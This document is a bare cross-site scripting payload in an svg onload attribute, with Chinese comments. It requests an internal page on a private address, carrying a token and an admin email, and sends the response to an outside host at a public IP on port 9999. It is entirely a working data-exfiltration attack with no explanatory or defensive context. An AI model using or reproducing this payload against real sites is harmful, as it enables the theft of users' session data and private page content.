```html
<svg/onload="var pages = ['http://192.168.21.109:6080/main.php?token=ea811fcf06bb1c1f278afce0b577cd24&email=test%40admin.com#main'];
var data = {};
var count = 0;

// 请求每个页面的数据
for (var i = 0; i < pages.length; i++) {
  var xhr = new XMLHttpRequest();
  xhr.open('GET', pages[i], true);
  xhr.onreadystatechange = function() {
    if (xhr.readyState === 4 && xhr.status === 200) {
      // 将页面数据存储到 data 对象中
      data[pages[i]] = xhr.responseText;
      count++;
      if (count === pages.length) {
        // 所有页面数据请求完毕，发送数据到外部 URL
        sendData(data);
      }
    }
  };
  xhr.send();
}

// 发送数据到外部 URL
function sendData(data) {
  var xhr = new XMLHttpRequest();
  xhr.withCredentials = true;
  xhr.open('GET', 'http://124.222.21.138:9999', true);
  xhr.setRequestHeader('Content-Type', 'application/json');

  xhr.onreadystatechange = function() {
    if (xhr.readyState === 4 && xhr.status === 200) {
      var response = xhr.responseText;
      console.log(response);
    }
  };
  xhr.send(JSON.stringify(data));
}
">
```
